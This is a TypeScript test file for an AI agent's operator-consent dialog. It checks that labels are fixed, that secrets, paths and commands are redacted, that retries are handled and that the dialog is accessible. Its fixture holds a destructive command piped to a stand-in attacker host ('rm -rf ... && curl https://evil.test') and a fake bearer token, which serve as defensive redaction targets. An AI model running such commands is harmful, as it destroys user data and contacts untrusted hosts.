import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it, vi } from "vitest";
import type { PermissionRequest } from "./protocol";
import {
  applyConsentEscape,
  canSubmitConsent,
  closedRiskLabel,
  closedToolLabel,
  consentBlocksWorkspaceShortcuts,
  CONSENT_COPY,
  permissionQueueAfterAcknowledgement,
  phaseAfterAcknowledgement,
  presentDeniedPermissionRecord,
  presentOperatorConsent,
  presentationContainsForbiddenRaw,
  redactUntrustedDisplay,
  settleOperatorConsentAcknowledgement,
  standingGrantFactsAtThisHead,
  trapConsentTabKey,
} from "./operatorConsentPresentation";

const css = readFileSync(
  join(dirname(fileURLToPath(import.meta.url)), "..", "styles", "app.css"),
  "utf8",
);

function req(overrides: Partial<PermissionRequest> = {}): PermissionRequest {
  return {
    id: "req-aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
    session_id: "session-background-aaaa",
    tool_name: "run_terminal_cmd",
    summary: "Allow run_terminal_cmd on session-background-aaaa?",
    detail: {
      risk: "nested shell -c (opaque script)",
      risk_tier: "ask",
      command: "rm -rf /Users/secret && curl https://evil.test",
      path: "/Users/secret/repo",
      token: "Authorization: Bearer sk-test-not-a-real-key",
    },
    ...overrides,
  };
}

describe("operatorConsentPresentation", () => {
  it("maps known tools and unknown/path-like names to closed labels", () => {
    expect(closedToolLabel("run_terminal_cmd")).toBe("Terminal command");
    expect(closedToolLabel("write_file")).toBe("Write a file");
    expect(closedToolLabel("/Users/secret/tool")).toBe(CONSENT_COPY.toolUnknown);
    expect(closedToolLabel({ raw: true })).toBe(CONSENT_COPY.toolUnknown);
    expect(closedRiskLabel("deny")).toBe(CONSENT_COPY.riskDeny);
    expect(closedRiskLabel("ask")).toBe(CONSENT_COPY.riskAsk);
    expect(closedRiskLabel("invented")).toBe(CONSENT_COPY.riskUnknown);
  });

  it("redacts secrets, control characters, paths, commands, and identifiers", () => {
    expect(redactUntrustedDisplay("Authorization: Bearer sk-test-not-a-real-key")).toBe("");
    expect(redactUntrustedDisplay("/Users/secret/repo")).toBe("");
    expect(redactUntrustedDisplay("rm -rf /tmp/x")).toBe("");
    expect(redactUntrustedDisplay("req-aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee")).toBe("");
    expect(redactUntrustedDisplay("session-background-aaaa")).toBe("");
    expect(redactUntrustedDisplay("safe note\u0007with bell")).toBe("safe notewith bell");
    expect(redactUntrustedDisplay("plain risk note")).toBe("plain risk note");
  });

  it("never offers Always Allow and reports host facts unavailable at this head", () => {
    const facts = standingGrantFactsAtThisHead();
    expect(facts.offered).toBe(false);
    expect(facts.scope).toBe("unavailable");
    expect(facts.lifetime).toBe("unavailable");
    expect(facts.revision).toBe("unavailable");
    const presented = presentOperatorConsent({
      request: req({
        detail: { scope: "workspace", lifetime: "forever", revision: 99 },
      }),
      phase: "idle",
    });
    expect(presented.offerStandingGrant).toBe(false);
    expect(presented.standingGrant.offered).toBe(false);
    expect(presented.details.join("\n")).toMatch(/Scope: unavailable/);
    expect(presented.details.join("\n")).not.toMatch(/forever|workspace|99/);
  });

  it("renders closed labels and strips raw leakage from live and recovery copy", () => {
    const presented = presentOperatorConsent({
      request: req(),
      queuedBehind: 2,
      phase: "idle",
      denyHistory: [
        {
          at: 1,
          tool_name: "run_terminal_cmd",
          summary: "Allow shell: rm -rf /Users/secret",
          session_id: "session-background-aaaa",
          risk: "high-risk shell pattern",
          risk_tier: "deny",
        },
      ],
    });
    const haystack = [
      presented.title,
      presented.toolLabel,
      presented.riskLabel,
      presented.summary,
      presented.sessionFact,
      presented.queueCopy,
      presented.liveAlert,
      presented.liveStatus,
      presented.recovery,
      presented.nextAction,
      presented.details.join(" "),
      presented.denyHistory.map((item) => `${item.toolLabel} ${item.summary}`).join(" "),
    ].join("\n");
    expect(presented.toolLabel).toBe("Terminal command");
    expect(presented.queueCopy).toBe(CONSENT_COPY.queued);
    expect(
      presentationContainsForbiddenRaw(haystack, [
        "req-aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
        "session-background-aaaa",
        "/Users/secret",
        "Authorization: Bearer",
        "sk-test-not-a-real-key",
        "rm -rf",
        "run_terminal_cmd",
      ]),
    ).toEqual([]);
    expect(JSON.stringify(presented)).not.toMatch(/\{"id":/);
  });

  it("explains pending and unconfirmed recovery without implying success or safe retry", () => {
    const pending = presentOperatorConsent({ request: req(), phase: "pending" });
    const lost = presentOperatorConsent({ request: req(), phase: "unconfirmed" });
    expect(pending.recovery).toMatch(/Do not assume success/);
    expect(pending.recovery).not.toMatch(/succeeded|safe to retry|was denied/i);
    expect(lost.recovery).toMatch(/Response unconfirmed/);
    expect(lost.recovery).toMatch(/Do not retry/);
    expect(lost.nextAction).not.toMatch(/try again|safe retry|succeeded/i);
  });

  it("settles acknowledgement without retry and freezes the queue unless acknowledged", async () => {
    const send = vi.fn().mockResolvedValue(undefined);
    await expect(settleOperatorConsentAcknowledgement(send, 50)).resolves.toBe(
      "acknowledged",
    );
    expect(send).toHaveBeenCalledOnce();

    const reject = vi.fn().mockRejectedValue(new Error("host closed"));
    await expect(settleOperatorConsentAcknowledgement(reject, 50)).resolves.toBe(
      "rejected",
    );
    expect(reject).toHaveBeenCalledOnce();

    const hang = vi.fn().mockReturnValue(new Promise(() => {}));
    await expect(settleOperatorConsentAcknowledgement(hang, 20)).resolves.toBe("lost");
    expect(hang).toHaveBeenCalledOnce();

    const queue = [req({ id: "r1" }), req({ id: "r2", tool_name: "write_file" })];
    expect(permissionQueueAfterAcknowledgement(queue, "r1", "rejected")).toEqual(queue);
    expect(permissionQueueAfterAcknowledgement(queue, "r1", "lost")).toEqual(queue);
    expect(permissionQueueAfterAcknowledgement(queue, "r1", "acknowledged")).toEqual([
      queue[1],
    ]);
  });

  it("allows Escape Deny only while idle and blocks workspace shortcuts while consent exists", () => {
    expect(applyConsentEscape("idle")).toBe("deny");
    expect(applyConsentEscape("pending")).toBe("suppress");
    expect(applyConsentEscape("unconfirmed")).toBe("suppress");
    expect(canSubmitConsent("idle")).toBe(true);
    expect(canSubmitConsent("pending")).toBe(false);
    expect(phaseAfterAcknowledgement("rejected")).toBe("unconfirmed");
    expect(consentBlocksWorkspaceShortcuts(true)).toBe(true);
    expect(consentBlocksWorkspaceShortcuts(false)).toBe(false);
  });

  it("stores only bounded deny-history fields and never raw session identifiers", () => {
    const record = presentDeniedPermissionRecord(req(), "session-background-aaaa");
    expect(record.session_id).toBe("owning-session");
    expect(record.summary).not.toMatch(/session-background|Users\/secret|Bearer/);
  });

  it("wraps Tab when focus is on the last control or has escaped the root", () => {
    const root = document.createElement("div");
    const first = document.createElement("button");
    const last = document.createElement("button");
    first.textContent = "Deny";
    last.textContent = "Allow once";
    root.append(first, last);
    document.body.append(root);
    last.focus();
    const wrap = { key: "Tab", shiftKey: false, preventDefault: vi.fn() };
    trapConsentTabKey(wrap, root);
    expect(wrap.preventDefault).toHaveBeenCalledOnce();
    expect(document.activeElement).toBe(first);
    const outside = { key: "Tab", shiftKey: true, preventDefault: vi.fn() };
    document.body.focus();
    trapConsentTabKey(outside, root);
    expect(outside.preventDefault).toHaveBeenCalledOnce();
    expect(document.activeElement).toBe(last);
    root.remove();
  });

  it("keeps consent CSS source evidence for focus, contrast, motion, text, and narrow layout", () => {
    expect(css).toMatch(/\.modal\.permission-modal[^{]*\{[\s\S]*font-size:\s*1rem/);
    expect(css).toMatch(
      /\.modal\.permission-modal[\s\S]*:focus-visible[\s\S]*outline:\s*3px solid var\(--accent\)/,
    );
    expect(css).toMatch(/@media \(forced-colors:\s*active\)[\s\S]*permission-modal/);
    expect(css).toMatch(
      /@media \(prefers-reduced-motion:\s*reduce\)[\s\S]*data-modal-layer="consent"/,
    );
    expect(css).toMatch(/@media \(max-width:\s*36rem\)[\s\S]*permission-modal/);
    expect(css).toMatch(/200%–400% text|200%-400% text/);
    expect(css).toMatch(/min-height:\s*44px/);
  });
});
